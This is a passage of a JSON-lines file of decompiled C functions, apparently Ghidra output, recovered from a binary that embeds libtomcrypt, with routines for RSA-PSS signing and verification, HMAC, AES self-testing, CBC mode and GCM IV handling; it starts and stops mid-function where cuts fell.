(allocated_memory != (void *)0x0) { \n                size_t size_buffer = hash_size; \n                \n                return_value = (*DAT_00669a80)(signature, hash_size, allocated_memory, &size_buffer, 0, key_data);\n                \n                \n                if (return_value == 0) {\n                    \n                    if (hash_size == size_buffer) {\n                        ulong_value = (ulong)(int)function_result; \n                        \n                        \n                        if (flags == 3) {\n                            \n                            return_value = FUN_004211f0(hash_data, hash_length, allocated_memory, hash_size, context, algorithm, ulong_value, status);\n                        } else {\n                            algorithm_index = (long)(int)algorithm; \n                            \n                            if ((&DAT_0064e660)[algorithm_index * 0x1a] != 0) {\n                                size_t calculated_size = ((ulong_value >> 3) - 3) + (ulong)((function_result & 7) != 0); \n                                void *additional_memory = malloc(calculated_size); \n                                \n                                \n                                if (additional_memory != (void *)0x0) {\n                                    \n                                    return_value = FUN_0041f630(allocated_memory, hash_size, 1, ulong_value, additional_memory, &calculated_size, local_1cc);\n                                    \n                                    \n                                    if (return_value == 0) {\n                                        undefined *comparison_buffer = local_1b8; \n                                        undefined4 function_params[2] = {0xd, 0}; \n                                        \n                                        \n                                        return_value = FUN_00418740(additional_memory, calculated_size, function_params, 2, 1);\n                                        \n                                        \n                                        if ((((return_value == 0) && (comparison_length == (&DAT_0064e660)[algorithm_index * 0x1a])) &&\n                                            (return_value = memcmp(comparison_buffer, &DAT_0064e5e0 + algorithm_index * 0xd0, comparison_length * 8), return_value == 0)) &&\n                                            (hash_length == expected_length && (return_value = memcmp(allocated_memory, hash_data, hash_length), return_value == 0)))) {\n                                            *status = 1; \n                                        }\n                                    }\n                                    free(additional_memory); \n                                }\n                            }\n                        }\n                    }\n                }\n                free(allocated_memory); \n            }\n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00421a80", "Address": "00421a80", "Source Code": "int FUN_00421a80(long message_hash, undefined8 context, ulong output_length, undefined8 input_data, uint param_a,\nuint param_b, ulong flags, byte *output_buffer, ulong *output_length_ptr)\n{\n    ulong required_size; \n    int return_status; \n    void *allocated_memory; \n    ulong calculated_size; \n    long index; \n    undefined local_buffer[280]; \n    \n    if (message_hash == 0) {\n        FUN_00410bc0(\"msghash != NULL\", \"libtomcrypt.c\", 0x6c57);\n    }\n    \n    if (output_buffer == (byte *)0x0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6c58);\n    }\n    \n    if (output_length_ptr == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6c59);\n    }\n    \n    if (0xff < param_b) {\n        return 0xb; \n    }\n    index = (long)(int)param_b; \n    \n    if ((&DAT_0064e5c0)[index * 0x1a] == 0) {\n        return 0xb; \n    }\n    \n    if (0xff < param_a) {\n        return 0xc; \n    }\n    \n    if ((&DAT_006495c0)[(long)(int)param_a * 10] == 0) {\n        return 0xc; \n    }\n    required_size = (&DAT_0064e5d0)[index * 0x1a]; \n    calculated_size = (ulong)((flags & 7) != 0) + (flags >> 3); \n    \n    if (calculated_size < output_length || calculated_size < required_size + 2 + output_length) {\n        return 0x16; \n    }\n    allocated_memory = malloc(calculated_size); \n    \n    if (allocated_memory == (void *)0x0) {\n        return 0xd; \n    }\n    void *additional_memory_1 = malloc(calculated_size); \n    void *additional_memory_2 = malloc(calculated_size); \n    void *additional_memory_3 = malloc(calculated_size); \n    \n    if ((additional_memory_1 == (void *)0x0) || (additional_memory_2 == (void *)0x0) || (additional_memory_3 == (void *)0x0)) {\n        \n        free(allocated_memory);\n        free(additional_memory_1);\n        free(additional_memory_2);\n        free(additional_memory_3);\n        return 0xd; \n    }\n    \n    if (output_length != 0) {\n        ulong operation_result = (*(code *)(&DAT_006495e8)[(long)(int)param_a * 10])(additional_memory_2, output_length, input_data);\n        \n        if (operation_result != output_length) {\n            goto LAB_00421c2b; \n        }\n    }\n    \n    return_status = (**(code **)(&DAT_0064e668 + index * 0xd0))(local_buffer);\n    if (return_status == 0) {\n        FUN_004205c0(allocated_memory, 8); \n        return_status = (**(code **)(&DAT_0064e670 + index * 0xd0))(local_buffer, allocated_memory, 8);\n        \n        if (return_status == 0) {\n            index = index * 0xd0; \n            return_status = (**(code **)(&DAT_0064e670 + index))(local_buffer, message_hash, context);\n            \n            if (((return_status == 0) &&\n                (return_status = (**(code **)(&DAT_0064e670 + index))(local_buffer, additional_memory_2, output_length), return_status == 0)) &&\n                (return_status = (**(code **)(&DAT_0064e678 + index))(local_buffer), return_status == 0)) {\n                index = (calculated_size - output_length) - required_size; \n                memset(allocated_memory, 0, index - 2); \n                *(undefined *)((long)allocated_memory + index + -2) = 1; \n                memcpy((void *)((long)allocated_memory + index + -1), additional_memory_2, output_length); \n                return_status = FUN_0041eae0(param_b, additional_memory_3, required_size, additional_memory_1, ~required_size + calculated_size); \n                \n                if (return_status == 0) {\n                    for (size_t remaining_size = 0; remaining_size != ~required_size + calculated_size; remaining_size++) {\n                        *(byte *)((long)allocated_memory + remaining_size) ^= *(byte *)((long)additional_memory_1 + remaining_size); \n                    }\n                    \n                    if (*output_length_ptr < calculated_size) {\n                        *output_length_ptr = calculated_size; \n                        return_status = 6; \n                    } else {\n                        \n                        memcpy(output_buffer, allocated_memory, remaining_size);\n                        memcpy(output_buffer + remaining_size, additional_memory_3, required_size);\n                        output_buffer[remaining_size + required_size] = 0xbc; \n                        *output_buffer &= (byte)(0xff >> (('\\x01' - (char)flags) + (char)calculated_size * '\\b' & 0x1fU)); \n                        *output_length_ptr = calculated_size; \n                    }\n                }\n            }\n        }\n    }\nLAB_00421c2b:\n    \n    free(additional_memory_3);\n    free(additional_memory_2);\n    free(additional_memory_1);\n    free(allocated_memory);\n    return return_status; \n}"}
{"Function Name": "FUN_00421fa0", "Address": "00421fa0", "Source Code": "ulong FUN_00421fa0(long input_param, undefined8 input_param2, long output_param, ulong *output_length_ptr, uint key_param,\nundefined8 input_param6, uint input_param7, uint input_param8, undefined8 input_param9, long key_param2)\n{\n    int int_return_value; \n    uint uint_return_value; \n    ulong ulong_return_value; \n    void *memory_ptr; \n    ulong local_ulong_value; \n    size_t local_memory_size; \n    undefined4 local_temp_array[2]; \n    long local_long_value; \n    undefined4 local_temp_array2[2]; \n    undefined4 *local_array_pointer; \n    \n    if (input_param == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x71b7); \n    }\n    \n    if (output_param == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x71b8); \n    }\n    \n    if (output_length_ptr == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x71b9); \n    }\n    \n    if (key_param2 == 0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x71ba); \n    }\n    \n    if ((key_param & 0xfffffffd) != 1) {\n        return 0x18; \n    }\n    \n    if (key_param == 3) {\n        \n        if (0xff < input_param7) {\n            return 0xc; \n        }\n        \n        if ((&DAT_006495c0)[(long)(int)input_param7 * 10] == 0) {\n            return 0xc; \n        }\n        \n        if (0xff < input_param8) {\n            return 0xb; \n        }\n        \n        if ((&DAT_0064e5c0)[(long)(int)input_param8 * 0x1a] == 0) {\n            return 0xb; \n        }\n        \n        int_return_value = (*DAT_00669968)(*(undefined8 *)(key_param2 + 0x18));\n        \n        ulong_return_value = (*DAT_00669990)(*(undefined8 *)(key_param2 + 0x18));\n        local_ulong_value = *output_length_ptr; \n        \n        if (ulong_return_value <= local_ulong_value) {\n            \n            ulong_return_value = FUN_00421a80(input_param, input_param2, input_param9, input_param6, input_param7, input_param8, (long)int_return_value, output_param, &local_ulong_value);\n            \n            if ((int)ulong_return_value != 0) {\n                return ulong_return_value; \n            }\n            goto LAB_0042211e; \n        }\n    } else {\n        \n        int_return_value = (*DAT_00669968)(*(undefined8 *)(key_param2 + 0x18));\n        \n        ulong_return_value = (*DAT_00669990)(*(undefined8 *)(key_param2 + 0x18));\n        \n        if (ulong_return_value <= *output_length_ptr) {\n            \n            local_long_value = (&DAT_0064e660)[(long)(int)input_param8 * 0x1a];\n            \n            if (local_long_value == 0) {\n                return 0x10; \n            }\n            local_array_pointer = local_temp_array; \n            local_temp_array[0] = 7; \n            local_temp_array2[0] = 0xd; \n            \n            local_memory_size = (*DAT_00669990)(*(undefined8 *)(key_param2 + 0x18));\n            \n            memory_ptr = malloc(local_memory_size);\n            if (memory_ptr == (void *)0x0) {\n                return 0xd; \n            }\n            \n            uint_return_value = FUN_00419040(local_temp_array2, 2, memory_ptr, &local_memory_size, 0xd);\n            \n            if (uint_return_value != 0) {\n                free(memory_ptr); \n                return (ulong)uint_return_value; \n            }\n            local_ulong_value = *output_length_ptr; \n            \n            uint_return_value = FUN_00405aa0(memory_ptr, local_memory_size, 1, (long)int_return_value, 0, 0, output_param, &local_ulong_value);\n            \n            if (uint_return_value != 0) {\n                free(memory_ptr); \n                return (ulong)uint_return_value; \n            }\n            free(memory_ptr); \nLAB_0042211e:\n            \n            ulong_return_value = (*DAT_00669a80)(output_param, local_ulong_value, output_param, output_length_ptr, 1, key_param2);\n            return ulong_return_value; \n        }\n    }\n    *output_length_ptr = ulong_return_value; \n    return 6; \n}"}
{"Function Name": "FUN_00422360", "Address": "00422360", "Source Code": "ulong FUN_00422360(long input_pointer, int input_integer, long output_pointer, ulong *output_length, uint flag, int *key_pointer)\n{\n    uint intermediate_unsigned_result; \n    int intermediate_integer_result; \n    ulong return_value; \n    ulong specific_ulong_result; \n    ulong another_ulong_result; \n    ulong yet_another_ulong_result; \n    long long_result; \n    undefined8 local_data_1; \n    undefined8 local_data_2; \n    undefined8 local_data_3; \n    \n    if (input_pointer == 0) {\n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x6fe6);\n    }\n    \n    if (output_pointer == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x6fe7);\n    }\n    \n    if (output_length == (ulong *)0x0) {\n        FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x6fe8);\n    }\n    \n    if (key_pointer == (int *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x6fe9);\n    }\n    \n    if (flag == 1 && *key_pointer != 1) {\n        return 0xf; \n    }\n    \n    if (flag > 1) {\n        return 0x12; \n    }\n    \n    return_value = FUN_0041ae70(&local_data_1, &local_data_2, &local_data_3, 0);\n    if ((int)return_value != 0) {\n        return return_value; \n    }\n    \n    intermediate_unsigned_result = (*DAT_006699a0)(local_data_1, input_pointer, (long)input_integer);\n    return_value = (ulong)intermediate_unsigned_result; \n    if (intermediate_unsigned_result == 0) { \n        return_value = 0x16; \n        intermediate_integer_result = (*DAT_00669958)(*(undefined8 *)(key_pointer + 6), local_data_1); \n        if (intermediate_integer_result != -1) { \n            if (flag == 1) { \n                \n                intermediate_unsigned_result = (*DAT_00669a40)(local_data_1, *(undefined8 *)(key_pointer + 0xe), *(undefined8 *)(key_pointer + 8), local_data_2);\n                return_value = (ulong)intermediate_unsigned_result; \n                if (intermediate_unsigned_result != 0) goto LAB_00422414; \n                \n                intermediate_unsigned_result = (*DAT_00669a40)(local_data_1, *(undefined8 *)(key_pointer + 0x10), *(undefined8 *)(key_pointer + 10), local_data_3);\n                return_value = (ulong)intermediate_unsigned_result; \n                if (intermediate_unsigned_result != 0) goto LAB_00422414; \n                \n                intermediate_unsigned_result = (*DAT_006699b8)(local_data_2, local_data_3, local_data_1);\n                return_value = (ulong)intermediate_unsigned_result; \n                if (intermediate_unsigned_result != 0) goto LAB_00422414; \n                \n                intermediate_unsigned_result = (*DAT_006699a8)(local_data_1, local_data_1, local_data_1);\n            } else { \n                \n                intermediate_unsigned_result = (*DAT_00669a40)(local_data_1, *(undefined8 *)(key_pointer + 2), *(undefined8 *)(key_pointer + 6), local_data_1);\n            }\n            return_value = (ulong)intermediate_unsigned_result; \n            if (intermediate_unsigned_result == 0) { \n                specific_ulong_result = (*DAT_00669990)(*(undefined8 *)(key_pointer + 6)); \n                if (*output_length < specific_ulong_result) { \n                    *output_length = specific_ulong_result; \n                    return_value = 6; \n                } else {\n                    return_value = 1; \n                    another_ulong_result = (*DAT_00669990)(local_data_1); \n                    yet_another_ulong_result = (*DAT_00669990)(*(undefined8 *)(key_pointer + 6)); \n                    if (another_ulong_result <= yet_another_ulong_result) { \n                        *output_length = specific_ulong_result; \n                        FUN_004205c0(output_pointer, specific_ulong_result); \n                        long_result = (*DAT_00669990)(local_data_1); \n                        intermediate_unsigned_result = (*DAT_00669998)(local_data_1, (specific_ulong_result - long_result) + output_pointer); \n                        return_value = (ulong)intermediate_unsigned_result; \n                    }\n                }\n            }\n        }\n    }\nLAB_00422414:\n    FUN_0041aff0(local_data_1, local_data_2, local_data_3, 0); \n    return return_value; \n}"}
{"Function Name": "FUN_004226c0", "Address": "004226c0", "Source Code": "int FUN_004226c0(void) \n{\n    int returnValue; \n    char *charPointer; \n    undefined *undefinedPointer; \n    char dataBuffer[16]; \n    char comparisonBuffer[16]; \n    undefined additionalDataBuffer[4264]; \n    undefinedPointer = &DAT_004387e4; \n    do {\n        FUN_004205c0(additionalDataBuffer, 0x10a0); \n        returnValue = FUN_00413070(undefinedPointer, *(undefined4 *)(undefinedPointer + -4), 0, additionalDataBuffer); \n        if (returnValue != 0) { \n            return returnValue; \n        }\n        FUN_00413520(undefinedPointer + 0x20, dataBuffer, additionalDataBuffer); \n        FUN_004138d0(dataBuffer, comparisonBuffer, additionalDataBuffer); \n        if (memcmp(dataBuffer, undefinedPointer + 0x30, 0x10) != 0 || memcmp(comparisonBuffer, undefinedPointer + 0x20, 0x10) != 0) { \n            return 5; \n        }\n        memset(comparisonBuffer, 0, sizeof(comparisonBuffer)); \n        for (returnValue = 0; returnValue < 1000; returnValue++) { \n            FUN_00413520(dataBuffer, dataBuffer, additionalDataBuffer); \n        }\n        for (returnValue = 0; returnValue < 1000; returnValue++) { \n            FUN_004138d0(dataBuffer, dataBuffer, additionalDataBuffer); \n        }\n        for (charPointer = dataBuffer; charPointer != comparisonBuffer; charPointer++) { \n            if (*charPointer != '\\0') { \n                return 5; \n            }\n        }\n        undefinedPointer += 0x44; \n    } while (undefinedPointer != &DAT_004388b0); \n    return 0; \n}"}
{"Function Name": "FUN_004227f0", "Address": "004227f0", "Source Code": "int FUN_004227f0(long hmac, uint key_length, void *key, ulong data_length)\n{\n    int return_value; \n    void *allocated_memory; \n    void *destination_memory; \n    ulong size_value; \n    long index; \n    ulong allocated_size; \n    \n    if (hmac == 0) {\n        FUN_00410bc0(\"hmac != NULL\", \"libtomcrypt.c\", 0x77d6);\n    }\n    \n    if (key == (void *)0x0) {\n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x77d7);\n    }\n    \n    if (0xff < key_length) {\n        return 0xb; \n    }\n    index = (long)(int)key_length; \n    \n    if ((&DAT_0064e5c0)[index * 0x1a] == 0) {\n        return 0xb; \n    }\n    *(uint *)(hmac + 0x110) = key_length; \n    size_value = (&DAT_0064e5d0)[index * 0x1a]; \n    \n    if (data_length == 0) {\n        return 3; \n    }\n    allocated_size = *(ulong *)(&DAT_0064e5d8 + index * 0xd0); \n    allocated_memory = malloc(allocated_size); \n    \n    if (allocated_memory == (void *)0x0) {\n        return 0xd; \n    }\n    destination_memory = malloc(allocated_size); \n    *(void **)(hmac + 0x228) = destination_memory; \n    \n    if (destination_memory == (void *)0x0) {\n        free(allocated_memory); \n        return 0xd; \n    }\n    \n    if (allocated_size < data_length) {\n        size_t local_size = allocated_size; \n        return_value = FUN_0041aa70(key_length, key, data_length, destination_memory, &local_size); \n        if (return_value == 0) {\n            data_length = size_value; \n        }\n    } else {\n        memcpy(destination_memory, key, data_length); \n    }\n    \n    if (data_length < allocated_size) {\n        FUN_004205c0(data_length + *(long *)(hmac + 0x228), allocated_size - data_length); \n    }\n    size_value = 0; \n    \n    if (allocated_size != 0) {\n        do {\n            *(byte *)((long)allocated_memory + size_value) = *(byte *)(*(long *)(hmac + 0x228) + size_value) ^ 0x36; \n            size_value++; \n        } while (size_value != allocated_size); \n    }\n    index = index * 0xd0; \n    \n    return_value = (**(code **)(&DAT_0064e668 + index))(hmac);\n    \n    if ((return_value == 0) && (return_value = (**(code **)(&DAT_0064e670 + index))(hmac, allocated_memory, *(undefined8 *)(&DAT_0064e5d8 + index)), return_value == 0)) {\n        goto LAB_00422968; \n    }\n    free(*(void **)(hmac + 0x228)); \nLAB_00422968:\n    free(allocated_memory); \n    return return_value; \n}"}
{"Function Name": "FUN_00422a50", "Address": "00422a50", "Source Code": "undefined8 FUN_00422a50(long hmac, long input, undefined8 context)\n{\n    \n    if (hmac == 0) {\n        \n        FUN_00410bc0(\"hmac != NULL\", \"libtomcrypt.c\", 0x783f);\n    }\n    \n    \n    if (input == 0) {\n        \n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x7840);\n    }\n    \n    \n    uint retrievedValue = *(uint *)(hmac + 0x110);\n    \n    \n    if (retrievedValue < 0x100 && (&DAT_0064e5c0)[(long)(int)retrievedValue * 0x1a] != 0) {\n        \n        return (**(code **)(&DAT_0064e670 + (long)(int)retrievedValue * 0xd0))(hmac, input, context);\n    }\n    \n    \n    return 0xb;\n}"}
{"Function Name": "FUN_00422af0", "Address": "00422af0", "Source Code": "int FUN_00422af0(long hmac, long out, ulong *output_size)\n{\n    size_t allocation_size; \n    int status_code = 0xb; \n    void *first_allocation_ptr; \n    void *second_allocation_ptr; \n    ulong bytes_processed = 0; \n    long memory_size, offset; \n    \n    if (hmac == 0) {\n        FUN_00410bc0(\"hmac != NULL\", \"libtomcrypt.c\", 0x7871);\n    }\n    \n    if (out == 0) {\n        FUN_00410bc0(\"out != NULL\", \"libtomcrypt.c\", 0x7872);\n    }\n    \n    if (*(uint *)(hmac + 0x110) < 0x100) {\n        offset = (long)(int)*(uint *)(hmac + 0x110); \n        memory_size = offset * 0xd0; \n        \n        if ((&DAT_0064e5c0)[offset * 0x1a] != 0) {\n            allocation_size = (&DAT_0064e5d0)[offset * 0x1a]; \n            first_allocation_ptr = malloc(*(size_t *)(&DAT_0064e5d8 + memory_size)); \n            second_allocation_ptr = malloc(allocation_size); \n            \n            if ((second_allocation_ptr == (void *)0x0) || (first_allocation_ptr == (void *)0x0)) {\n                \n                if (first_allocation_ptr != (void *)0x0) {\n                    free(first_allocation_ptr);\n                }\n                status_code = 0xd; \n                \n                if (second_allocation_ptr != (void *)0x0) {\n                    free(second_allocation_ptr);\n                }\n            } else {\n                \n                status_code = (**(code **)(&DAT_0064e678 + memory_size))(hmac, second_allocation_ptr);\n                if (status_code == 0) {\n                    memory_size = *(long *)(&DAT_0064e5d8 + memory_size); \n                    \n                    if (memory_size != 0) {\n                        for (long index = 0; index < memory_size; index++) {\n                            *(byte *)((long)first_allocation_ptr + index) = *(byte *)(*(long *)(hmac + 0x228) + index) ^ 0x5c;\n                        }\n                    }\n                    offset = offset * 0xd0; \n                    \n                    status_code = (**(code **)(&DAT_0064e668 + offset))(hmac);\n                    \n                    if ((((status_code == 0) &&\n                        (status_code = (**(code **)(&DAT_0064e670 + offset))(hmac, first_allocation_ptr, *(undefined8 *)(&DAT_0064e5d8 + offset)), status_code == 0)) &&\n                        (status_code = (**(code **)(&DAT_0064e670 + offset))(hmac, second_allocation_ptr, allocation_size), status_code == 0)) &&\n                        (status_code = (**(code **)(&DAT_0064e678 + offset))(hmac, first_allocation_ptr), status_code == 0)) {\n                        \n                        if (*output_size != 0) {\n                            for (bytes_processed = 0; bytes_processed < allocation_size && bytes_processed < *output_size; bytes_processed++) {\n                                *(undefined *)(out + bytes_processed) = *(undefined *)((long)first_allocation_ptr + bytes_processed);\n                            }\n                        }\n                    }\n                    *output_size = bytes_processed; \n                }\n            }\n            \n            free(*(void **)(hmac + 0x228));\n            free(second_allocation_ptr);\n            free(first_allocation_ptr);\n        }\n    }\n    return status_code; \n}"}
{"Function Name": "FUN_00422da0", "Address": "00422da0", "Source Code": "int FUN_00422da0(long input_data, long output_data, ulong length, uint *control_array)\n{\n    uint second_element; \n    int return_status; \n    long loop_counter; \n    long inner_loop_counter; \n    ulong intermediate_values[2]; \n    \n    if (output_data == 0) {\n        FUN_00410bc0(\"pt != NULL\", \"libtomcrypt.c\", 0x7fe8);\n    }\n    \n    if (input_data == 0) {\n        FUN_00410bc0(\"ct != NULL\", \"libtomcrypt.c\", 0x7fe9);\n    }\n    \n    if (control_array == (uint *)0x0) {\n        FUN_00410bc0(\"cbc != NULL\", \"libtomcrypt.c\", 0x7fea);\n    }\n    \n    return_status = 10; \n    \n    if (*control_array < 0x100) {\n        loop_counter = (long)(int)*control_array; \n        \n        if ((&DAT_0065b5c0)[loop_counter * 0x16] != 0) {\n            second_element = control_array[1]; \n            return_status = 0x10; \n            \n            if ((second_element - 1 < 0x80) && (length % (ulong)(long)(int)second_element == 0)) {\n                \n                if ((second_element & 7) == 0) {\n                    \n                    if (*(code **)(&DAT_0065b628 + loop_counter * 0xb0) == (code *)0x0) {\n                        return_status = 0; \n                        \n                        if (length != 0) {\n                            \n                            while ((return_status = (**(code **)(&DAT_0065b5f0 + loop_counter * 0xb0))(input_data, intermediate_values, control_array + 0x22), return_status == 0)) {\n                                second_element = control_array[1]; \n                                loop_counter = (long)(int)second_element; \n                                \n                                if (0 < (int)second_element) {\n                                    \n                                    for (inner_loop_counter = 0; inner_loop_counter < (long)(int)second_element; inner_loop_counter += 8) {\n                                        ulong value_from_intermediate = *(ulong *)((long)intermediate_values + inner_loop_counter); \n                                        ulong value_from_control_array = *(ulong *)((long)control_array + inner_loop_counter + 8); \n                                        \n                                        *(undefined8 *)((long)control_array + inner_loop_counter + 8) = *(undefined8 *)(input_data + inner_loop_counter);\n                                        *(ulong *)(output_data + inner_loop_counter) = value_from_intermediate ^ value_from_control_array; \n                                    }\n                                }\n                                \n                                input_data += loop_counter; \n                                output_data += loop_counter; \n                                length -= loop_counter; \n                                \n                                if (length == 0) {\n                                    return 0;\n                                }\n                                loop_counter = (long)(int)*control_array; \n                            }\n                        }\n                    }\n                }\n            } else {\n                \n                return_status = (**(code **)(&DAT_0065b628 + loop_counter * 0xb0))(input_data, output_data, length / (ulong)(long)(int)second_element, control_array + 2, control_array + 0x22);\n            }\n        }\n    } else {\n        return_status = 0x10; \n    }\n    return return_status; \n}"}
{"Function Name": "FUN_00422ff0", "Address": "00422ff0", "Source Code": "ulong FUN_00422ff0(long input_ptr, long output_ptr, ulong data_size, uint *cbc_params)\n{\n    ulong *cbc_data_ptr; \n    ulong temp_var; \n    long index; \n    ulong *cbc_data_ptr_next; \n    long index_temp; \n    int loop_index; \n    uint cbc_length; \n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"pt != NULL\", \"libtomcrypt.c\", 0x8071);\n    }\n    \n    if (output_ptr == 0) {\n        FUN_00410bc0(\"ct != NULL\", \"libtomcrypt.c\", 0x8072);\n    }\n    \n    if (cbc_params == (uint *)0x0) {\n        FUN_00410bc0(\"cbc != NULL\", \"libtomcrypt.c\", 0x8073);\n    }\n    \n    if (*cbc_params < 0x100) {\n        index_temp = (long)(int)*cbc_params; \n        \n        if ((&DAT_0065b5c0)[index_temp * 0x16] != 0) {\n            cbc_length = cbc_params[1]; \n            \n            if ((cbc_length - 1 < 0x80) && (data_size % (ulong)(long)(int)cbc_length == 0)) {\n                \n                if ((cbc_length & 7) == 0) {\n                    \n                    if (*(code **)(&DAT_0065b620 + index_temp * 0xb0) != (code *)0x0) {\n                        \n                        return (**(code **)(&DAT_0065b620 + index_temp * 0xb0))(input_ptr, output_ptr, data_size / (ulong)(long)(int)cbc_length, cbc_params + 2, cbc_params + 0x22);\n                    }\n                    cbc_data_ptr = (ulong *)(cbc_params + 2); \n                    \n                    if (data_size != 0) {\n                        while (true) {\n                            \n                            if (0 < (int)cbc_length) {\n                                loop_index = 0; \n                                cbc_data_ptr_next = cbc_data_ptr; \n                                while (true) {\n                                    index = (long)loop_index; \n                                    loop_index += 8; \n                                    *cbc_data_ptr_next ^= *(ulong *)(input_ptr + index); \n                                    \n                                    if ((int)cbc_length <= loop_index) break;\n                                    cbc_data_ptr_next = (ulong *)((long)cbc_params + (long)loop_index + 8); \n                                }\n                            }\n                            \n                            if ((**(code **)(&DAT_0065b5e8 + index_temp * 0xb0))(cbc_data_ptr, output_ptr, cbc_params + 0x22) != 0) break;\n                            loop_index = 0; \n                            cbc_length = cbc_params[1]; \n                            cbc_data_ptr_next = cbc_data_ptr; \n                            \n                            if (0 < (int)cbc_length) {\n                                while (true) {\n                                    index_temp = (long)loop_index; \n                                    loop_index += 8; \n                                    *cbc_data_ptr_next = *(ulong *)(output_ptr + index_temp); \n                                    \n                                    if ((int)cbc_length <= loop_index) break;\n                                    cbc_data_ptr_next = (ulong *)((long)cbc_params + (long)loop_index + 8); \n                                }\n                            }\n                            index_temp = (long)(int)cbc_length; \n                            output_ptr += index_temp; \n                            input_ptr += index_temp; \n                            data_size -= index_temp; \n                            \n                            if (data_size == 0) break;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 10; \n}"}
{"Function Name": "FUN_00423210", "Address": "00423210", "Source Code": "undefined8 FUN_00423210(void *iv, ulong *len, long cbc)\n{\n    \n    if (iv == (void *)0x0) {\n        \n        FUN_00410bc0(\"IV != NULL\", \"libtomcrypt.c\", 0x80d1);\n    }\n    \n    \n    if (len == (ulong *)0x0) {\n        \n        FUN_00410bc0(\"len != NULL\", \"libtomcrypt.c\", 0x80d2);\n    }\n    \n    \n    if (cbc == 0) {\n        \n        FUN_00410bc0(\"cbc != NULL\", \"libtomcrypt.c\", 0x80d3);\n    }\n    \n    \n    size_t size = (size_t)*(int *)(cbc + 4);\n    \n    \n    if (*len < size) {\n        \n        *len = size;\n        return 6; \n    }\n    \n    \n    memcpy(iv, (void *)(cbc + 8), size);\n    \n    \n    *len = size;\n    \n    return 0; \n}"}
{"Function Name": "FUN_004232c0", "Address": "004232c0", "Source Code": "undefined8 FUN_004232c0(void *input_pointer, size_t data_size, long cbc_pointer)\n{\n    \n    if (input_pointer == (void *)0x0) {\n        \n        FUN_00410bc0(\"IV != NULL\", \"libtomcrypt.c\", 0x8102);\n    }\n    \n    \n    if (cbc_pointer == 0) {\n        \n        FUN_00410bc0(\"cbc != NULL\", \"libtomcrypt.c\", 0x8103);\n    }\n    \n    \n    if ((long)*(int *)(cbc_pointer + 4) == data_size) {\n        \n        memcpy((void *)(cbc_pointer + 8), input_pointer, data_size);\n        return 0; \n    }\n    \n    return 0x10; \n}"}
{"Function Name": "FUN_00423340", "Address": "00423340", "Source Code": "undefined8\nFUN_00423340(uint input_value,long iv_pointer,long key_pointer,undefined4 cipher_param1,undefined4 cipher_param2,\nuint *output_array)\n{\n    \n    if (iv_pointer == 0) {\n        FUN_00410bc0(\"IV != NULL\",\"libtomcrypt.c\",0x8135);\n    }\n    \n    if (key_pointer == 0) {\n        FUN_00410bc0(\"key != NULL\",\"libtomcrypt.c\",0x8136);\n    }\n    \n    if (output_array == (uint *)0x0) {\n        FUN_00410bc0(\"cbc != NULL\",\"libtomcrypt.c\",0x8137);\n    }\n    \n    \n    if (input_value < 0x100) {\n        long index = (long)(int)input_value; \n        \n        if ((&DAT_0065b5c0)[index * 0x16] != 0) {\n            \n            undefined8 function_result = (**(code **)(&DAT_0065b5e0 + index * 0xb0))(key_pointer,cipher_param1,cipher_param2,output_array + 0x22);\n            \n            if ((int)function_result == 0) {\n                uint retrieved_value = (&DAT_0065b5d4)[index * 0x2c]; \n                *output_array = input_value; \n                output_array[1] = retrieved_value; \n                \n                if (0 < (int)retrieved_value) {\n                    for (long index = 0; index < (ulong)(retrieved_value); index++) {\n                        *(undefined *)((long)output_array + index + 8) = *(undefined *)(iv_pointer + index);\n                    }\n                }\n                return 0; \n            }\n            return function_result; \n        }\n    }\n    return 10; \n}"}
{"Function Name": "FUN_004234c0", "Address": "004234c0", "Source Code": "undefined4 FUN_004234c0(long context, ulong *input_data, ulong data_length)\n{\n    uint status_code; \n    undefined4 return_value; \n    long index; \n    ulong *data_pointer; \n    ulong remaining_bytes; \n    ulong processed_length = 0; \n    \n    if (context == 0) {\n        FUN_00410bc0(\"gcm != NULL\", \"libtomcrypt.c\", 0x8173);\n    }\n    \n    if ((data_length != 0) && (input_data == (ulong *)0x0)) {\n        FUN_00410bc0(\"IV != NULL\", \"libtomcrypt.c\", 0x8175);\n    }\n    \n    if ((*(int *)(context + 0x10f8) == 0) && (status_code = *(uint *)(context + 0x10fc), status_code < 0x10)) {\n        \n        if ((*(uint *)(context + 0x10f0) < 0x100) && ((&DAT_0065b5c0)[(long)(int)*(uint *)(context + 0x10f0) * 0x16] != 0)) {\n            \n            if (0xc < (long)(int)status_code + data_length) {\n                *(uint *)(context + 0x10f4) |= 1;\n            }\n            \n            if (status_code == 0) {\n                \n                if ((data_length & 0xfffffffffffffff0) != 0) {\n                    data_pointer = input_data; \n                    do {\n                        \n                        *(ulong *)(context + 0x10b0) ^= *data_pointer;\n                        *(ulong *)(context + 0x10b8) ^= data_pointer[1];\n                        processed_length += 0x10; \n                        data_pointer += 2; \n                        FUN_00423460(context, context + 0x10b0); \n                        *(long *)(context + 0x1100) += 0x80; \n                    } while (processed_length < (data_length & 0xfffffffffffffff0)); \n                }\n                input_data = (ulong *)((long)input_data + processed_length); \n            }\n            return_value = 0; \n            \n            for (remaining_bytes = processed_length; remaining_bytes < data_length; remaining_bytes++) {\n                *(int *)(context + 0x10fc) += 1; \n                \n                *(undefined *)(context + 0x10e0 + (long)(*(int *)(context + 0x10fc) - 1)) =\n                    *(undefined *)((long)input_data + (remaining_bytes - processed_length));\n                \n                if (*(int *)(context + 0x10fc) == 0x10) {\n                    index = 0; \n                    do {\n                        \n                        *(byte 